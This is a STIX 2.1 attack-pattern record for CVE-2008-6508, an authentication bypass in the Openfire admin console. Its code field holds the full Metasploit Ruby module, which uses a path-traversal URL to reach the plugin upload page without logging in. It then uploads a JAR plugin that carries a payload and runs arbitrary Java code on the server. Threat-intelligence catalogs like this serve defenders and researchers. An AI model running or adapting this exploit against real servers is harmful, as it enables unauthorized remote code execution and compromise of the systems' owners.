{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--391be122-70a9-4a2b-b177-5b90014faeaa",
    "created": "2024-08-14T17:07:47.837469Z",
    "modified": "2024-08-14T17:07:47.837473Z",
    "name": "Openfire Admin Console Authentication Bypass",
    "description": " This module exploits an authentication bypass vulnerability in the administration console of Openfire servers. By using this vulnerability it is possible to upload/execute a malicious Openfire plugin on the server and execute arbitrary Java code. This module has been tested against Openfire 3.6.0a.  It is possible to remove the uploaded plugin after execution, however this might turn the server in some kind of unstable state, making re-exploitation difficult. You might want to do this manually. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/openfire_auth_bypass.rb",
            "external_id": "openfire_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-6508"
        },
        {
            "source_name": "reference",
            "url": "http://community.igniterealtime.org/thread/35874"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /(Jetty)/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Openfire Admin Console Authentication Bypass',\n      'Description' => %q{\n          This module exploits an authentication bypass vulnerability in the administration\n        console of Openfire servers. By using this vulnerability it is possible to\n        upload/execute a malicious Openfire plugin on the server and execute arbitrary Java\n        code. This module has been tested against Openfire 3.6.0a.\n\n        It is possible to remove the uploaded plugin after execution, however this might turn\n        the server in some kind of unstable state, making re-exploitation difficult. You might\n        want to do this manually.\n      },\n      'Author'      =>\n        [\n          'Andreas Kurtz', # Vulnerability discovery\n          'h0ng10'         # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2008-6508' ],\n          [ 'OSVDB', '49663' ],\n          [ 'BID', '32189' ],\n          [ 'EDB', '7075' ],\n          [ 'URL', 'http://community.igniterealtime.org/thread/35874' ]\n        ],\n      'DisclosureDate' => '2008-11-10',\n      'Privileged'  => true,\n      'Platform'    => %w{ java linux win },\n      'Stance'      => Msf::Exploit::Stance::Aggressive,\n      'Targets'     =>\n        [\n          #\n          # Java version\n          #\n          [ 'Java Universal',\n            {\n                'Arch' => ARCH_JAVA,\n                'Platform' => 'java'\n            }\n          ],\n          #\n          # Platform specific targets\n          #\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ]\n        ],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(9090),\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),\n        OptString.new('PLUGINNAME',  [ false, 'Openfire plugin base name, (default: random)' ]),\n        OptString.new('PLUGINAUTHOR',[ false, 'Openfire plugin author, (default: random)' ]),\n        OptString.new('PLUGINDESC',  [ false, 'Openfire plugin description, (default: random)' ]),\n        OptBool.new('REMOVE_PLUGIN', [ false, 'Try to remove the plugin after installation', false ]),\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n\n    path = normalize_uri(base, \"login.jsp\")\n    res = send_request_cgi(\n      {\n        'uri'    => path\n      })\n\n    if (not res) or (res.code != 200)\n      vprint_error(\"Unable to make a request to: #{path}\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    versioncheck = res.body =~ /Openfire, \\D*: (\\d)\\.(\\d).(\\d)\\s*<\\/div>/\n\n    if versioncheck.nil? then\n      vprint_error(\"Unable to detect Openfire version\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Detected version: #{$1}.#{$2}.#{$3}\")\n    version = \"#{$1}#{$2}#{$3}\".to_i\n\n    return Exploit::CheckCode::Safe if version > 360\n\n    # Just to be sure, try to access the log page\n    path = \"#{base}setup/setup-/../../log.jsp\"\n    res = send_request_cgi(\n      {\n        'uri'    => path\n      })\n\n    if (not res) or (res.code != 200)\n      print_error(\"Failed: Error requesting #{path}\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def get_plugin_jar(plugin_name)\n    files = [\n      [ \"logo_large.gif\" ],\n      [ \"logo_small.gif\" ],\n      [ \"readme.html\" ],\n      [ \"changelog.html\" ],\n      [ \"lib\", \"plugin-metasploit.jar\" ]\n    ]\n\n    jar = Rex::Zip::Jar.new\n    jar.add_files(files, File.join(Msf::Config.data_directory, \"exploits\", \"openfire_plugin\"))\n\n    plugin_author = datastore['PLUGINAUTHOR'] || rand_text_alphanumeric(8+rand(8))\n    plugin_desc   = datastore['PLUGINDESC']   || rand_text_alphanumeric(8+rand(8))\n\n    plugin_xml = File.open(File.join(Msf::Config.data_directory, \"exploits\", \"openfire_plugin\", \"plugin.xml\"), \"rb\") {|fd| fd.read() }\n    plugin_xml.gsub!(/PLUGINNAME/, plugin_name)\n    plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)\n    plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)\n\n    jar.add_file(\"plugin.xml\", plugin_xml)\n\n    jar\n  end\n\n  def exploit\n    base = normalize_uri(target_uri.path)\n    base << '/' if base[-1, 1] != '/'\n\n    plugin_name = datastore['PLUGINNAME'] || rand_text_alphanumeric(8+rand(8))\n    plugin = get_plugin_jar(plugin_name)\n\n    arch = target.arch\n    plat = [Msf::Module::PlatformList.new(target['Platform']).platforms[0]]\n\n    if (p = exploit_regenerate_payload(plat, arch)) == nil\n      print_error(\"Failed to regenerate payload\")\n      return\n    end\n\n    plugin.add_file(\"lib/#{rand_text_alphanumeric(8)}.jar\", payload.encoded_jar.pack)\n    plugin.build_manifest\n\n    # Upload the plugin to the server\n    print_status(\"Uploading plugin #{plugin_name} to the server\")\n    boundary = rand_text_alphanumeric(6)\n\n    data = \"--#{boundary}\\r\\nContent-Disposition: form-data; name=\\\"uploadfile\\\"; \"\n    data << \"filename=\\\"#{plugin_name}.jar\\\"\\r\\nContent-Type: application/java-archive\\r\\n\\r\\n\"\n    data << plugin.pack\n    data << \"\\r\\n--#{boundary}--\"\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(base, 'setup/setup-/../../plugin-admin.jsp'),\n      'method'  => 'POST',\n      'data'    => data,\n      'encode_params' => false,\n      'headers' => {\n        'Content-Type'   => 'multipart/form-data; boundary=' + boundary,\n        'Content-Length' => data.length,\n        'Cookie' => \"JSESSIONID=#{rand_text_numeric(13)}\",\n      },\n      'vars_get' => {\n        'uploadplugin' => nil\n      }\n    })\n\n\n    print_warning(\"Warning: got no response from the upload, continuing...\") if !res\n\n    # Delete the uploaded JAR file\n    if datastore['REMOVE_PLUGIN']\n      print_status(\"Deleting plugin #{plugin_name} from the server\")\n      res = send_request_cgi({\n        'uri'     => normalize_uri(base, 'setup/setup-/../../plugin-admin.jsp'),\n        'encode_params' => false,\n        'headers' => {\n          'Cookie' => \"JSESSIONID=#{rand_text_numeric(13)}\",\n        },\n        'vars_get' => {\n          'deleteplugin' => plugin_name.downcase\n        }\n      })\n      if not res\n        print_error(\"Error deleting the plugin #{plugin_name}. You might want to do this manually.\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-11-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}